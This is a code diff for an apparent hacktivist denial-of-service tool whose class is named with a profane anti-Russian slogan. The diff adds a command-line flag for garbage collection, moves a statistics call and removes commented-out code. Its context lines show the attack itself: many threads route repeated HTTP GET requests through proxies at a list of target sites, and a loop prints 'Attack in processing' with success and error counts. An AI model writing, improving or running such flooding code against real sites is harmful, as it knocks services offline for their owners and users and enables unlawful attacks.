@@ -44,12 +44,12 @@ class FuckYouRussianShip:
     }
 
     def __init__(self):
-        gc.enable()
         disable_warnings()
         parser = self.create_parser()
         self.args, self.unknown = parser.parse_known_args()
         self.no_clear = self.args.no_clear
         self.proxy_view = self.args.proxy_view
+        self.use_gc = self.args.use_gc
 
         self.targets = self.args.targets
         self.threads = int(self.args.threads)
@@ -65,6 +65,8 @@ class FuckYouRussianShip:
 
         if self.proxy_view:
             work_statistic = False
+        if self.use_gc:
+            gc.enable()
 
     @staticmethod
     def clear():
@@ -82,8 +84,10 @@ class FuckYouRussianShip:
         parser_obj.set_defaults(verbose=False)
         parser_obj.add_argument("-lo", "--logger-output", dest="logger_output")
         parser_obj.add_argument("-lr", "--logger-results", dest="logger_results")
+        parser_obj.add_argument("-gc", "--use-gc", dest="use_gc", action='store_true')
         parser_obj.set_defaults(no_clear=False)
         parser_obj.set_defaults(proxy_view=False)
+        parser_obj.set_defaults(use_gc=False)
         parser_obj.set_defaults(logger_output=stderr)
         parser_obj.set_defaults(logger_results=stderr)
         return parser_obj
@@ -186,14 +190,14 @@ class FuckYouRussianShip:
                         scraper.proxies.update(
                             {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                         response = scraper.get(site)
-                        self.write_statistic_success(site, response.status_code)
 
                         if response.status_code >= 200 and response.status_code <= 302:
+                            self.write_statistic_success(site, response.status_code)
                             for i in range(self.MAX_REQUESTS):
                                 response = scraper.get(site, timeout=10)
                                 self.write_statistic_success(site, response.status_code)
                                 del response
-                else:
+                else:                    
                     for i in range(self.MAX_REQUESTS):
                         response = scraper.get(site, timeout=10)
                         self.write_statistic_success(site, response.status_code)
@@ -230,7 +234,6 @@ class FuckYouRussianShip:
     @staticmethod
     def print_statistic():
         FuckYouRussianShip.clear()
-        #tracker = SummaryTracker()
         while True:
             if len(statistic.keys()):
                 print(f"Attack in processing... Success: {general_statistics[0]} | Errors: {general_statistics[1]}")
@@ -254,20 +257,11 @@ class FuckYouRussianShip:
                 tp.table(data=statistic_data,
                          headers=headers,
                          width=[len(max(list(statistic.keys()), key=len)), 10, 10, 10, 10, 10, 8])            
-            #tracker.print_diff()
             sleep(5)
             FuckYouRussianShip.clear()
 
     def parts_recursive(self, n, parts=[]):
         return parts + [n] if n < 500 else self.parts_recursive(n - 500, parts + [500, ])
-
-
-# def regenerate_threading():
-#     while True:
-#         if threads_count < thread_count // 2:
-#             attacker_threading(thread_count // 2, attack_func)
-#         else:
-#             sleep(2)
 
 
 def attacker_threading(threads_count, worker_func):
@@ -303,7 +297,6 @@ if __name__ == '__main__':
         if not attacker.no_clear:
             attacker.clear()
         attacker.checkReq()
-        # attacker.checkUpdate()
 
         thread_count = attacker.threads
         attack_func = attacker.mainth
